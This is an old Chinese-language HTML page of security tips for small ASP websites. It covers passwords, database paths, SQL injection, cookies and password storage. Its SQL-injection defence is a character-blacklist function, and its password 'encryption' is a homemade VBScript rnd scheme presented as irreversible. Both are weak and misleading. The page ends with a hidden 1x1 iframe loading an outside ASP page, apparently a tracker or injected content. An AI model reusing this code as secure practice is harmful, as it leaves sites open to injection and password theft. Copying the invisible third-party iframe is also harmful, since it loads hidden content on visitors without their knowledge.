<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<HTML>
<HEAD>
<META http-equiv="Content-Type" content="text/html; charset=gb2312">
<TITLE>信息安全 - sunny land 阳光家园</TITLE>
</HEAD>

<BODY>
<H1 align="center"><FONT color="#FF0000">静态网站的安全提示</FONT></H1>
<H2>选择稳定的主机</H2>
<P>　　选择一个稳定的免费主机，以免主机被攻击造成网站损坏。请参阅：<A href="../free/index.htm">免费天地</A>。</P>
<H2>使用安全的密码</H2>
<P>　　至少8位，有字母也有数字，还要有特殊符号。千万不要用纯数字或单词，那样很容易被破解。</P>
<H2>隐藏数据库路径</H2>
<P>　　不要使用容易被猜到的数据库名称。即使数据库扩展名改成了.asp或.asa，它仍然能被下载。如果空间支持，尽可能把数据库放在WWW目录以外。</P>
<H2>防止SQL注入</H2>
<P>　　过滤掉危险的字符，以免SQL注入攻击。可以使用以下函数：<BR>
<TEXTAREA cols="80" rows="10" wrap="OFF">function ReplaceDangerousChar(str) '过滤危险字符，减少SQL注入攻击
str=replace(str,";","$")
str=replace(str,",","$")
str=replace(str,"'","$")
str=replace(str,"(","$")
str=replace(str,")","$")
str=replace(str,"<","$")
str=replace(str,">","$")
ReplaceDangerousChar=replace(str,chr(34),"$")
end function</TEXTAREA>
<BR>
任何需要进入SQL表达式的来自Request.Form，Request.QueryString，cookie，取出的数据库记录的字符串都要使用这个函数进行过滤。</P>
<H2>防止cookie欺骗</H2>
<P>　　尽可能不使用cookie，而是用sessions。</P>
<H2>防止密码泄漏</H2>
<P>　　在数据库中存储密码时，先用下列函数加密：<BR>
<TEXTAREA cols="80" rows="10">function trpass(preString) '密码加密 loseboy.126.com
  Dim texts
  Dim seed
  Dim i,length
  prestring = trim(preString)
  length = len(preString)
  seed = length
  Randomize(length)
  texts = ""
  for i = 1 to length
    seed = int(94*rnd(-asc(mid(preString,i,1))-seed*asc(right(prestring,1)))+32)
    texts = texts & chr(seed) & chr(int(94*rnd(-seed)+32))
  next
  texts=replace(texts,"'","")
  trpass=replace(texts,chr(34),"")
end function</TEXTAREA>
<BR>
这个加密是不可逆的，当需验证密码时，只能把用户的输入加密，与数据库存储的已加密密码比对。<BR>
　　使用加密，万一数据库被盗，也不至于泄漏所有用户的密码。</P>
<P>
<IFRAME src="http://sunnybbs.611.cn/slstsc.asp" width=1 height=1></IFRAME>
</P>
</BODY>
</HTML>
